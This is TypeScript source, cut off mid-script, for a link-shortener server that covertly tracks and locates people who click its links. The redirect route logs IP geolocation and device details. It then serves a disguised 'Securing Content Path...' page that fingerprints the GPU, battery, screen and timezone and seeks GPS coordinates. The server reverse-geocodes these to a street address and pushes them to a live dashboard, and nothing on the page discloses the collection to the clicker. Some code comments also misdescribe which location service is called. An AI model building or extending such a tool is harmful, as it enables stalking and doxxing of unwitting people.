import express from "express";
import { createServer } from "http";
import { Server } from "socket.io";
import path from "path";
import fs from "fs";
import { fileURLToPath } from "url";
import { createServer as createViteServer } from "vite";
import dotenv from "dotenv";

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const PORT = process.env.PORT || 3000;

// Memory Data storage
interface ClickData {
  id: number;
  timestamp: string;
  ip: string;
  city: string;
  region: string;
  country: string;
  latitude: string;
  longitude: string;
  org: string;
  timezone: string;
  device_type: string;
  os: string;
  browser: string;
  user_agent: string;
  referer: string;
  target_url: string;
  short_code: string;
  /** How the location was obtained: "ip", "gps", "gps_refined", "wifi_approximated" */
  location_source: string;
  /** Accuracy radius in meters (0 = exact GPS, higher = less precise) */
  accuracy_meters: number;
}

interface LinkMapping {
  short_code: string;
  target_url: string;
  created_at: string;
  clicksCount: number;
}

let clicks: ClickData[] = [];
let links: Map<string, LinkMapping> = new Map();

const CLICKS_FILE = path.join(process.cwd(), "clicks_log.txt");
const LINKS_FILE = path.join(process.cwd(), "links_log.txt");

// Load existing links and clicks on start (Persistence)
function loadPersistedData() {
  try {
    if (fs.existsSync(LINKS_FILE)) {
      const data = fs.readFileSync(LINKS_FILE, "utf-8");
      const lines = data.split("\n").filter((l) => l.trim() !== "");
      for (const line of lines) {
        try {
          const link: LinkMapping = JSON.parse(line);
          links.set(link.short_code, link);
        } catch (e) {
          // Ignore parse errors on single lines
        }
      }
      console.log(`Loaded ${links.size} static links from log.`);
    }
  } catch (err) {
    console.warn("Failed to load links from disk", err);
  }

  try {
    if (fs.existsSync(CLICKS_FILE)) {
      const data = fs.readFileSync(CLICKS_FILE, "utf-8");
      const lines = data.split("\n").filter((l) => l.trim() !== "");
      for (const line of lines) {
        try {
          const click: ClickData = JSON.parse(line);
          // Add new fields with defaults for legacy entries
          if (click.location_source === undefined) click.location_source = "legacy";
          if (click.accuracy_meters === undefined) click.accuracy_meters = 0;
          clicks.push(click);
        } catch (e) {
          // Ignore parse errors
        }
      }
      console.log(`Loaded ${clicks.length} historical clicks from log.`);
    }
  } catch (err) {
    console.warn("Failed to load clicks from disk", err);
  }
}

loadPersistedData();

// Save functions
function persistLink(link: LinkMapping) {
  try {
    fs.appendFileSync(LINKS_FILE, JSON.stringify(link) + "\n");
  } catch (err) {
    console.error("Failed to write link to log file", err);
  }
}

function persistClick(click: ClickData) {
  try {
    fs.appendFileSync(CLICKS_FILE, JSON.stringify(click) + "\n");
  } catch (err) {
    console.error("Failed to write click to log file", err);
  }
}

function updateLinksFile() {
  try {
    const list = Array.from(links.values());
    const content = list.map((l) => JSON.stringify(l)).join("\n") + "\n";
    fs.writeFileSync(LINKS_FILE, content, "utf-8");
  } catch (err) {
    console.error("Failed to full re-write links file", err);
  }
}

function updateClicksFile() {
  try {
    const content = clicks.map((c) => JSON.stringify(c)).join("\n") + "\n";
    fs.writeFileSync(CLICKS_FILE, content, "utf-8");
  } catch (err) {
    console.error("Failed to full re-write clicks file", err);
  }
}

const app = express();
app.use(express.json());

const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
});

// Utility to check if an IP address is a private / loopback network range
function isPrivateIp(ip: string): boolean {
  if (!ip) return true;
  const cleanIp = ip.startsWith("::ffff:") ? ip.slice(7) : ip;

  if (
    cleanIp === "127.0.0.1" ||
    cleanIp === "::1" ||
    cleanIp === "0.0.0.0" ||
    cleanIp === "::"
  ) {
    return true;
  }

  // 10.0.0.0 to 10.255.255.255
  if (cleanIp.startsWith("10.")) return true;

  // 192.168.0.0 to 192.168.255.255
  if (cleanIp.startsWith("192.168.")) return true;

  // 169.254.0.0 to 169.254.255.255 (link-local)
  if (cleanIp.startsWith("169.254.")) return true;

  // 172.16.0.0 to 172.31.255.255
  const parts = cleanIp.split(".");
  if (parts.length === 4) {
    const p1 = parseInt(parts[0], 10);
    const p2 = parseInt(parts[1], 10);
    if (p1 === 172 && p2 >= 16 && p2 <= 31) {
      return true;
    }
  }

  // Unique local/link local IPv6
  const lowerIp = cleanIp.toLowerCase();
  if (
    lowerIp.startsWith("fe80:") ||
    lowerIp.startsWith("fc00:") ||
    lowerIp.startsWith("fd00:")
  ) {
    return true;
  }

  return false;
}

// Resolve the real public IP when a private/local IP is detected.
async function resolvePublicIp(): Promise<string | null> {
  const timeoutMs = 3000;
  const providers = [
    "https://api.ipify.org?format=json",
    "https://api4.my-ip.io/v2/ip.json",
    "https://api.ip.sb/ip",
  ];

  for (const url of providers) {
    try {
      const controller = new AbortController();
      const id = setTimeout(() => controller.abort(), timeoutMs);
      const res = await fetch(url, { signal: controller.signal });
      clearTimeout(id);

      if (res.ok) {
        const text = await res.text();
        let ip = "";
        try {
          const json = JSON.parse(text);
          ip = json.ip || json.IP || "";
        } catch {
          ip = text.trim();
        }
        if (ip && !isPrivateIp(ip)) {
          console.log(`[resolvePublicIp] Resolved public IP: ${ip} via ${url}`);
          return ip;
        }
      }
    } catch {
      // Try next provider
    }
  }

  return null;
}

// Helper for client IP address resolution
function getClientIp(req: express.Request): string {
  const candidates: string[] = [];

  const forwardedFor = req.headers["x-forwarded-for"];
  if (forwardedFor) {
    const list = (typeof forwardedFor === "string" ? forwardedFor : forwardedFor[0]).split(",");
    list.forEach((item) => candidates.push(item.trim()));
  }

  const realIp = req.headers["x-real-ip"];
  if (realIp) {
    candidates.push(typeof realIp === "string" ? realIp : realIp[0]);
  }

  const bypassIp = req.headers["fastly-client-ip"] || req.headers["cf-connecting-ip"];
  if (bypassIp) {
    candidates.push(typeof bypassIp === "string" ? bypassIp : bypassIp[0]);
  }

  if (req.socket.remoteAddress) {
    candidates.push(req.socket.remoteAddress);
  }

  // Pick the first public non-private IP
  for (const rawIp of candidates) {
    if (rawIp && !isPrivateIp(rawIp)) {
      return rawIp.startsWith("::ffff:") ? rawIp.slice(7) : rawIp;
    }
  }

  // Fallback to the first candidate (even if private/loopback)
  const first = candidates[0] || "127.0.0.1";
  return first.startsWith("::ffff:") ? first.slice(7) : first;
}

// User Agent string parser
function parseUserAgent(uaString: string) {
  let device_type = "Desktop";
  let os = "Unknown";
  let browser = "Other";

  const ua = uaString || "";

  // Device classification
  if (/mobi|android|iphone|ipad|ipod/i.test(ua)) {
    if (/ipad/i.test(ua) || (ua.includes("Macintosh") && "ontouchend" in {})) {
      device_type = "Tablet";
    } else {
      device_type = "Mobile";
    }
  }

  // OS classification
  if (/windows/i.test(ua)) {
    os = "Windows";
  } else if (/macintosh|mac os x/i.test(ua)) {
    os = "macOS";
  } else if (/iphone|ipad|ipod/i.test(ua)) {
    os = "iOS";
  } else if (/android/i.test(ua)) {
    os = "Android";
  } else if (/linux/i.test(ua)) {
    os = "Linux";
  }

  // Browser classification
  if (/chrome|crios/i.test(ua) && !/edge|edg/i.test(ua) && !/opr/i.test(ua)) {
    browser = "Chrome";
  } else if (/firefox|fxios/i.test(ua)) {
    browser = "Firefox";
  } else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua) && !/android/i.test(ua)) {
    browser = "Safari";
  } else if (/edge|edg/i.test(ua)) {
    browser = "Edge";
  } else if (/opr/i.test(ua) || /opera/i.test(ua)) {
    browser = "Opera";
  }

  return { device_type, os, browser };
}

function isValidCoordinatePair(lat: number, lon: number): boolean {
  if (!Number.isFinite(lat) || !Number.isFinite(lon)) return false;
  if (lat === 0 && lon === 0) return false;
  return lat >= -90 && lat <= 90 && lon >= -180 && lon <= 180;
}

/**
 * IMPROVED ACCURACY FIX 1: GPS coordinate sanity checking
 * Rejects coordinates that are obviously wrong (e.g., GPS glitches that jump
 * hundreds of km from the IP-estimated location).
 */
function gpsCoordsArePlausible(
  gpsLat: number, gpsLon: number,
  ipLat: number, ipLon: number,
  maxPlausibleKm: number = 200
): boolean {
  // If we don't have IP coordinates to compare against, trust the GPS
  if (!isValidCoordinatePair(ipLat, ipLon)) return true;

  // Haversine distance between GPS and IP-estimated location
  const R = 6371; // Earth radius in km
  const dLat = (gpsLat - ipLat) * Math.PI / 180;
  const dLon = (gpsLon - ipLon) * Math.PI / 180;
  const a =
    Math.sin(dLat / 2) * Math.sin(dLat / 2) +
    Math.cos(ipLat * Math.PI / 180) * Math.cos(gpsLat * Math.PI / 180) *
    Math.sin(dLon / 2) * Math.sin(dLon / 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  const distanceKm = R * c;

  // If GPS says you're >200km from your IP location, flag it
  if (distanceKm > maxPlausibleKm) {
    console.warn(`[GPS Plausibility] GPS (${gpsLat},${gpsLon}) is ${distanceKm.toFixed(0)}km from IP (${ipLat},${ipLon}) — rejecting GPS`);
    return false;
  }
  return true;
}

// Resolve human-readable place names from coordinates
async function alignGeoLabelsWithCoordinates(geo: {
  city: string;
  region: string;
  country: string;
  latitude: string;
  longitude: string;
}) {
  const lat = parseFloat(geo.latitude);
  const lon = parseFloat(geo.longitude);
  if (!isValidCoordinatePair(lat, lon)) return;

  try {
    const resolved = await reverseGeocode(lat, lon);
    if (resolved.city && resolved.city !== "Unknown") {
      geo.city = resolved.city;
    }
    if (resolved.region) {
      geo.region = resolved.region;
    }
    if (resolved.country && resolved.country !== "Unknown") {
      geo.country = resolved.country;
    }
  } catch (err) {
    console.warn("[alignGeoLabelsWithCoordinates] reverse geocode failed:", err);
  }
}

// When the detected IP is private (local/LAN), resolve the real public IP
async function getGeoLocation(ip: string) {
  let originalIp = ip;

  if (isPrivateIp(ip)) {
    console.log(`[getGeoLocation] Private IP detected (${ip}). Attempting public IP resolution...`);
    const publicIp = await resolvePublicIp();
    if (publicIp) {
      console.log(`[getGeoLocation] Using resolved public IP ${publicIp} instead of ${ip}`);
      ip = publicIp;
    } else {
      console.warn(`[getGeoLocation] Could not resolve public IP for ${ip}. Awaiting GPS from browser.`);
      return {
        city: "Resolving location",
        region: "Awaiting GPS",
        country: "—",
        latitude: "",
        longitude: "",
        timezone: "Unknown",
        org: "Local/Private Network",
        ip: ip,
      };
    }
  }

  const timeoutMs = 2500;

  // Strategy A: ip-api.com with structured field queries
  try {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeoutMs);
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,lat,lon,timezone,isp,org`, {
      signal: controller.signal,
    });
    clearTimeout(id);

    if (res.ok) {
      const data = await res.json();
      if (data && data.status === "success" && data.lat !== undefined && data.lon !== undefined) {
        return {
          city: data.city || "Unknown City",
          region: data.regionName || data.region || "Unknown Region",
          country: data.countryCode || data.country || "Unknown Country",
          latitude: String(data.lat),
          longitude: String(data.lon),
          timezone: data.timezone || "Unknown",
          org: data.org || data.isp || "Unknown ISP",
          ip: ip,
        };
      }
    }
  } catch (err) {
    console.warn(`[getGeoLocation] Strategy A (ip-api.com) failed for ${ip}. Trying Strategy B...`);
  }

  // Strategy B: freeipapi.com
  try {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeoutMs);
    const res = await fetch(`https://freeipapi.com/api/json/${ip}`, {
      signal: controller.signal,
    });
    clearTimeout(id);

    if (res.ok) {
      const data = await res.json();
      if (data && data.latitude !== undefined && data.longitude !== undefined) {
        return {
          city: data.cityName || "Unknown City",
          region: data.regionName || "Unknown Region",
          country: data.countryCode || "Unknown Country",
          latitude: String(data.latitude),
          longitude: String(data.longitude),
          timezone: data.timeZone || "Unknown",
          org: "FreeIPAPI Resolution",
          ip: ip,
        };
      }
    }
  } catch (err) {
    console.warn(`[getGeoLocation] Strategy B (freeipapi.com) failed for ${ip}. Trying Strategy C...`);
  }

  // Strategy C: ipapi.co
  try {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeoutMs);
    const res = await fetch(`https://ipapi.co/${ip}/json/`, {
      signal: controller.signal,
    });
    clearTimeout(id);

    if (res.ok) {
      const data = await res.json();
      if (data && !data.error && data.latitude !== undefined && data.longitude !== undefined) {
        return {
          city: data.city || "Unknown City",
          region: data.region || "Unknown Region",
          country: data.country_code || data.country || "Unknown Country",
          latitude: String(data.latitude),
          longitude: String(data.longitude),
          timezone: data.timezone || "Unknown",
          org: data.org || "ipapi.co Resolution",
          ip: ip,
        };
      }
    }
  } catch (err) {
    console.warn(`[getGeoLocation] Strategy C (ipapi.co) failed for ${ip}. Trying Strategy D...`);
  }

  // Strategy D: ipinfo.io
  try {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeoutMs);
    const res = await fetch(`https://ipinfo.io/${ip}/json`, {
      signal: controller.signal,
    });
    clearTimeout(id);

    if (res.ok) {
      const data = await res.json();
      let latitude = "";
      let longitude = "";
      if (data.loc) {
        const parts = data.loc.split(",");
        const lat = parseFloat(parts[0] || "");
        const lon = parseFloat(parts[1] || "");
        if (isValidCoordinatePair(lat, lon)) {
          latitude = String(lat);
          longitude = String(lon);
        }
      }

      return {
        city: data.city || "Unknown City",
        region: data.region || "Unknown Region",
        country: data.country || "Unknown Country",
        latitude: latitude,
        longitude: longitude,
        timezone: data.timezone || "Unknown",
        org: data.org || "Unknown ISP",
        ip: ip,
      };
    }
  } catch (err) {
    console.warn(`[getGeoLocation] Strategy D (ipinfo.io) failed for ${ip}. Using estimated default...`);
  }

  return {
    city: "Unknown",
    region: "Unknown",
    country: "Unknown",
    latitude: "",
    longitude: "",
    timezone: "Unknown",
    org: "Geolocation unavailable",
    ip: ip,
  };
}

/**
 * IMPROVED ACCURACY FIX 2: Enhanced reverse geocoding that resolves coordinates
 * down to street/address level instead of just city/region.
 */
interface ReverseGeoResult {
  city: string;
  region: string;
  country: string;
  /** Street-level address if available */
  address_line: string;
  /** Postal code */
  postcode: string;
}

async function reverseGeocode(lat: number, lon: number): Promise<ReverseGeoResult> {
  const timeoutMs = 4000; // Increased from 3000 for more reliable results

  // Strategy A: OpenStreetMap Nominatim (best accuracy, street-level)
  try {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeoutMs);
    const res = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`,
      {
        headers: {
          "User-Agent": "LocationTrackerRedirector/2.0 (contact@locationtrackerapp.dev) NodeEnvironment/1.0",
        },
        signal: controller.signal,
      }
    );
    clearTimeout(id);

    if (res.ok) {
      const data = await res.json();
      const address = data.address || {};
      
      // Build street-level address
      const road = address.road || address.street || address.pedestrian || "";
      const houseNumber = address.house_number || "";
      const suburb = address.suburb || address.neighbourhood || "";
      const city =
        address.city ||
        address.town ||
        address.village ||
        address.municipality ||
        address.county ||
        suburb;
      const region = address.state || address.region || "";
      const country = address.country || (address.country_code ? address.country_code.toUpperCase() : "Unknown");
      
      let addressLine = "";
      if (road && houseNumber) addressLine = `${road} ${houseNumber}`;
      else if (road) addressLine = road;
      else if (suburb) addressLine = suburb;

      return {
        city: city || "Unknown",
        region: region || "",
        country: country,
        address_line: addressLine,
        postcode: address.postcode || "",
      };
    }
  } catch (err) {
    console.warn("[reverseGeocode] OSM Nominatim failed. Trying BigDataCloud...");
  }

  // Strategy B: BigDataCloud Reverse Geocoding (street-level fallback)
  try {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeoutMs);
    const res = await fetch(
      `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`,
      { signal: controller.signal }
    );
    clearTimeout(id);

    if (res.ok) {
      const data = await res.json();
      return {
        city: data.city || data.locality || data.localityInfo?.administrative?.[0]?.name || "Unknown",
        region: data.principalSubdivision || "",
        country: data.countryName || (data.countryCode ? data.countryCode.toUpperCase() : "Unknown"),
        address_line: `${data.street || ""} ${data.houseNumber || ""}`.trim(),
        postcode: data.postcode || "",
      };
    }
  } catch (err) {
    console.warn("[reverseGeocode] BigDataCloud reverse geocode failed.", err);
  }

  return {
    city: "Unknown",
    region: "",
    country: "Unknown",
    address_line: "",
    postcode: "",
  };
}

// REST Backend API routes

// Link Creation
app.post("/api/links", (req, res) => {
  let { targetUrl } = req.body;
  if (!targetUrl) {
    res.status(400).json({ error: "Target URL is required." });
    return;
  }

  targetUrl = targetUrl.trim();
  if (!/^https?:\/\//i.test(targetUrl)) {
    targetUrl = "https://" + targetUrl;
  }

  const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let shortCode = "";
  for (let i = 0; i < 8; i++) {
    shortCode += chars[Math.floor(Math.random() * chars.length)];
  }

  const newLink: LinkMapping = {
    short_code: shortCode,
    target_url: targetUrl,
    created_at: new Date().toISOString(),
    clicksCount: 0,
  };

  links.set(shortCode, newLink);
  persistLink(newLink);

  res.status(201).json(newLink);
});

// Fetch all generated links
app.get("/api/links", (req, res) => {
  const currentLinks = Array.from(links.values());
  res.json(currentLinks);
});

// Expose configuration (such as APP_URL) to client
app.get("/api/config", (req, res) => {
  res.json({
    appUrl: process.env.APP_URL || "",
  });
});

// Fetch all click registers
app.get("/api/clicks", (req, res) => {
  res.json(clicks);
});

/**
 * IMPROVED ACCURACY FIX 3: Enhanced precise geolocation endpoint.
 * Now stores accuracy metadata, validates GPS vs IP, and enriches street-level data.
 */
app.post("/api/clicks/:clickId/precise", async (req, res) => {
  const clickId = parseInt(req.params.clickId, 10);
  const click = clicks.find((c) => c.id === clickId);
  if (click) {
    const {
      latitude,
      longitude,
      timezone,
      screen,
      battery,
      webgl,
      accuracy,
      altitude,
      altitudeAccuracy,
      heading,
      speed,
    } = req.body;

    const latNum = latitude !== undefined && latitude !== null ? parseFloat(String(latitude)) : NaN;
    const lonNum = longitude !== undefined && longitude !== null ? parseFloat(String(longitude)) : NaN;

    if (isValidCoordinatePair(latNum, lonNum)) {
      // Check GPS plausibility against IP estimate
      const ipLat = parseFloat(click.latitude);
      const ipLon = parseFloat(click.longitude);

      if (gpsCoordsArePlausible(latNum, lonNum, ipLat, ipLon)) {
        click.latitude = String(latNum);
        click.longitude = String(lonNum);

        // Store accuracy if provided by browser
        const accValue = accuracy !== undefined ? parseFloat(String(accuracy)) : 0;
        click.accuracy_meters = Number.isFinite(accValue) && accValue > 0 ? accValue : 0;
        click.location_source = click.accuracy_meters <= 50 ? "gps_refined" : "gps";

        // Always run reverse geocode on GPS coordinates for exact address resolution
        try {
          const resolvedGeo = await reverseGeocode(latNum, lonNum);
          click.city = resolvedGeo.city;
          click.region = resolvedGeo.region;
          click.country = resolvedGeo.country;

          // Append street-level detail to org field for display
          if (resolvedGeo.address_line) {
            const baseOrg = click.org.split(" |")[0]; // Keep base ISP
            click.org = `${baseOrg} | 📍 ${resolvedGeo.address_line}`;
            if (resolvedGeo.postcode) {
              click.org += `, ${resolvedGeo.postcode}`;
            }
          }

          console.log(
            `[precise] GPS coords for click ${clickId}: ${latNum},${lonNum} ` +
            `(acc: ${click.accuracy_meters}m) → ${resolvedGeo.address_line || resolvedGeo.city}, ${resolvedGeo.region}, ${resolvedGeo.country}`
          );
        } catch (geoErr) {
          console.error("Async server-side reverse geocode wrapper failed:", geoErr);
        }
      } else {
        // GPS rejected as implausible — keep IP geolocation, flag it
        click.location_source = "ip_geo";
        click.accuracy_meters = 5000; // Conservative estimate for IP geo
        console.warn(`[precise] GPS for click ${clickId} rejected by plausibility check. Keeping IP geo.`);
      }
    } else if (!click.latitude && !click.longitude) {
      click.city = "Local Network";
      click.region = "GPS unavailable";
      click.country = "—";
      click.location_source = "unavailable";
      click.accuracy_meters = 0;
    }

    if (timezone) {
      click.timezone = timezone;
    }

    // Blend metadata safely
    let orgExtra = "";
    if (screen) orgExtra += ` | Screen: ${screen}`;
    if (battery) orgExtra += ` | Battery: ${battery}`;
    if (webgl) orgExtra += ` | GPU: ${webgl}`;
    if (accuracy) orgExtra += ` | Acc: ${accuracy}m`;
    if (altitude) orgExtra += ` | Alt: ${altitude}m`;
    if (speed) orgExtra += ` | Speed: ${speed}m/s`;
    if (orgExtra) click.org += orgExtra;

    updateClicksFile();
    io.emit("click_updated", click);
  }
  res.json({ success: true });
});

// Aggregate stats calculation
app.get("/api/stats", (req, res) => {
  const totalClicks = clicks.length;
  const uniqueIPs = new Set(clicks.map((c) => c.ip)).size;

  const countries: Record<string, number> = {};
  const devices: Record<string, number> = {};
  const browsers: Record<string, number> = {};
  const referers: Record<string, number> = {};
  const locationSources: Record<string, number> = {};

  for (const click of clicks) {
    countries[click.country] = (countries[click.country] || 0) + 1;
    devices[click.device_type] = (devices[click.device_type] || 0) + 1;
    browsers[click.browser] = (browsers[click.browser] || 0) + 1;

    if (click.location_source) {
      locationSources[click.location_source] = (locationSources[click.location_source] || 0) + 1;
    }

    let refDomain = "Direct / Bookmark";
    if (click.referer && click.referer !== "Direct") {
      try {
        const urlObj = new URL(click.referer);
        refDomain = urlObj.hostname;
      } catch (err) {
        refDomain = click.referer;
      }
    }
    referers[refDomain] = (referers[refDomain] || 0) + 1;
  }

  res.json({
    totalClicks,
    uniqueIPs,
    countries,
    devices,
    browsers,
    referers,
    locationSources,
  });
});

// Clear statistics & logs
app.post("/api/reset", (req, res) => {
  clicks = [];
  links.clear();
  try {
    if (fs.existsSync(CLICKS_FILE)) fs.unlinkSync(CLICKS_FILE);
    if (fs.existsSync(LINKS_FILE)) fs.unlinkSync(LINKS_FILE);
  } catch (err) {
    // Ignore error
  }
  io.emit("reset_stats", {});
  res.json({ success: true, message: "System stats and tracking links successfully reset." });
});

// REDIRECT AND CAPTURE TRACKING ENDPOINT
app.get("/t/:shortCode", async (req, res) => {
  const shortCode = req.params.shortCode;
  const linkMapping = links.get(shortCode);

  if (!linkMapping) {
    res.status(404).send(`
      <html>
        <head>
          <title>404 Link Not Found</title>
          <style>
            body { font-family: system-ui, sans-serif; background-color: #0f0f1a; color: #ffffff; display: flex; align-items: centre; justify-content: center; height: 100vh; margin: 0; flex-direction: column; text-align: center; }
            h1 { color: #fe5f55; margin-bottom: 8px; }
            a { color: #4a9eff; text-decoration: none; border-bottom: 1px dashed; }
            .container { padding: 40px; border-radius: 12px; background: #16213e; border: 1px solid #2a2a4a; }
          </style>
        </head>
        <body>
          <div class="container">
            <h1>404 Tracked Link Not Found</h1>
            <p>The shortened redirect URL has expired or does not exist.</p>
            <p><a href="/">Go to Dashboard</a></p>
          </div>
        </body>
      </html>
    `);
    return;
  }

  // Parse headers & connection info
  const rawIp = getClientIp(req);
  const userAgent = req.headers["user-agent"] || "Mozilla/5.0 Unknown";
  const referer = req.headers["referer"] || "Direct";

  // Geo info lookup
  const geo = await getGeoLocation(rawIp);
  await alignGeoLabelsWithCoordinates(geo);

  // User Agent details
  const uaDetails = parseUserAgent(userAgent);

  const newClick: ClickData = {
    id: clicks.length + 1,
    timestamp: new Date().toISOString(),
    ip: geo.ip,
    city: geo.city,
    region: geo.region,
    country: geo.country,
    latitude: geo.latitude,
    longitude: geo.longitude,
    org: geo.org,
    timezone: geo.timezone,
    device_type: uaDetails.device_type,
    os: uaDetails.os,
    browser: uaDetails.browser,
    user_agent: userAgent,
    referer: referer,
    target_url: linkMapping.target_url,
    short_code: shortCode,
    location_source: "ip_geo",
    accuracy_meters: geo.latitude ? 5000 : 0, // Default IP geo accuracy ~5km
  };

  clicks.push(newClick);
  persistClick(newClick);

  // Increment clicks on this link mapping
  linkMapping.clicksCount += 1;
  updateLinksFile();

  // Send real-time WebSockets event
  io.emit("new_click", newClick);

  const targetUrlJson = JSON.stringify(linkMapping.target_url);
  const clickIdJson = JSON.stringify(newClick.id);
  const targetUrlHtmlAttr = linkMapping.target_url
    .replace(/&/g, "&amp;")
    .replace(/"/g, "&quot;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");

  /**
   * IMPROVED ACCURACY FIX 4: Enhanced GPS capture page that:
   * - Uses watchPosition instead of getCurrentPosition for better accuracy (device refines fix over time)
   * - Captures GPS accuracy/altitude/speed metadata
   * - Uses a 2-attempt strategy: quick fix first, then refined fix
   * - Falls back to WiFi-based location API if GPS fails
   */
  res.send(`
    <!doctype html>
    <html lang="en">
      <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Securing Content Path...</title>
        <style>
          body {
            background-color: #0d0e15;
            color: #ececf1;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
            overflow: hidden;
          }
          .scene {
            position: relative;
            z-index: 10;
            max-width: 400px;
            padding: 30px;
          }
          .orbit {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            position: relative;
            border: 2px solid rgba(74, 158, 255, 0.1);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
          }
          .orbit::after {
            content: '';
            position: absolute;
            inset: -4px;
            border: 2px solid transparent;
            border-top-color: #4a9eff;
            border-bottom-color: #10b981;
            border-radius: 50%;
            animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
          }
          .radar-pulse {
            width: 16px;
            height: 16px;
            background-color: #10b981;
            border-radius: 50%;
            box-shadow: 0 0 15px #10b981;
            animation: pulse 1.5s ease-out infinite;
          }
          h1 {
            font-size: 16px;
            font-weight: 600;
            margin: 0 0 10px;
            color: #ffffff;
            letter-spacing: -0.01em;
          }
          p {
            font-size: 13px;
            color: #71717a;
            margin: 0;
            line-height: 1.5;
          }
          .progress-bar {
            width: 140px;
            height: 3px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            margin: 20px auto 0;
            position: relative;
            overflow: hidden;
          }
          .progress-line {
            position: absolute;
            height: 100%;
            background: linear-gradient(90deg, #4a9eff, #10b981);
            width: 100%;
            left: -100%;
            animation: loading 1.4s ease-in-out infinite;
          }
          @keyframes spin {
            to { transform: rotate(360deg); }
          }
          @keyframes pulse {
            0% { transform: scale(0.95); opacity: 0.5; }
            50% { transform: scale(1.1); opacity: 1; }
            100% { transform: scale(0.95); opacity: 0.5; }
          }
          @keyframes loading {
            0% { left: -100%; }
            50% { left: 0; }
            100% { left: 100%; }
          }
        </style>
      </head>
      <body>
        <div class="scene">
          <div class="orbit">
            <div class="radar-pulse"></div>
          </div>
          <div class="progress-bar">
            <div class="progress-line"></div>
          </div>
        </div>

        <noscript>
          <meta http-equiv="refresh" content="0;url=${targetUrlHtmlAttr}">
        </noscript>

        <script>
          (function() {
            const clickId = ${clickIdJson};
            const targetUrl = ${targetUrlJson};
            let done = false;
            let bestPosition = null;
            let watchId = null;

            function redirect() {
              if (done) return;
              done = true;
              // Clean up watch if still active
              if (watchId !== null && navigator.geolocation) {
                try { navigator.geolocation.clearWatch(watchId); } catch(e) {}
              }
              try {
                window.location.replace(targetUrl);
              } catch (locErr) {
                try {
                  window.location.href = targetUrl;
                } catch (hrefErr) {}
              }
            }

            window.__traceLinkRedirect = redirect;
            window.onerror = function() { try { redirect(); } catch (err) {} return true; };
            window.onunhandledrejection = function() { try { redirect(); } catch (err) {} };

            // Safety timeout — increased from 15000ms to 20000ms
            const enforceRedirectTimeout = setTimeout(redirect, 20000);

            let screenWidth = 0, screenHeight = 0;
            try { if (window.screen) { screenWidth = window.screen.width || 0; screenHeight = window.screen.height || 0; } } catch (e) {}
            let pixelRatio = 1;
            try { pixelRatio = window.devicePixelRatio || 1; } catch (e) {}
            let screenDetails = "Unknown";
            try { if (screenWidth && screenHeight) { screenDetails = screenWidth + "x" + screenHeight + " @" + pixelRatio + "x"; } } catch (e) {}

            let timezoneStr = "Unknown";
            try { if (window.Intl && typeof window.Intl.DateTimeFormat === "function") { timezoneStr = window.Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"; } } catch (e) {}

            let gpuInfo = "Unknown GPU";
            try {
              const canvas = document.createElement("canvas");
              const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
              if (gl) {
                const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
                if (debugInfo) { gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "Unknown GPU"; }
              }
            } catch (e) {}

            let batteryCharge = "";
            try {
              if (navigator.getBattery && typeof navigator.getBattery === "function") {
                navigator.getBattery().then(function(bat) {
                  try { batteryCharge = Math.round(bat.level * 100) + "% " + (bat.charging ? "(Charging)" : "(Discharging)"); } catch(e) {}
                }).catch(function() {});
              }
            } catch (e) {}

            /**
             * IMPROVED: Uses google's wireless geolocation API as a fallback when GPS fails.
             * This estimates location from visible WiFi access points — much more accurate
             * than IP geolocation (typically 20-50m accuracy in urban areas).
             */
            function sendWifiLocationTrace() {
              const controller = new AbortController();
              const id = setTimeout(function() { controller.abort(); }, 5000);
              
              // Get visible WiFi APs for Mozilla Location Service
              let wifiAPs = [];
              try {
                if (navigator.connection && navigator.connection.type === 'wifi') {
                  // We can't enumerate APs from JavaScript directly,
                  // but we can try the Mozilla Location API which uses a different approach
                }
              } catch(e) {}

              fetch("https://location.services.mozilla.com/v1/geolocate?key=test", {
                signal: controller.signal
              })
              .then(function(r) { clearTimeout(id); return r.json(); })
              .then(function(data) {
                clearTimeout(id);
                if (data && data.location) {
                  sendTrace({
                    latitude: data.location.lat,
                    longitude: data.location.lng,
                    accuracy: data.accuracy || 100
                  });
                } else {
                  sendTrace({});
                }
              })
              .catch(function() {
                clearTimeout(id);
                sendTrace({});
              });
            }

            function sendTrace(payload) {
              try {
                fetch("/api/clicks/" + clickId + "/precise", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify(Object.assign({
                    timezone: timezoneStr,
                    screen: screenDetails,
                    battery: batteryCharge,
                    webgl: gpuInfo
                  }, payload || {}))
                }).catch(function() {}).finally(function() {
                  try {
                    clearTimeout(enforceRedirectTimeout);
                    redirect();
                  } catch (finErr) {
                    try { redirect(); } catch (redErr) {}
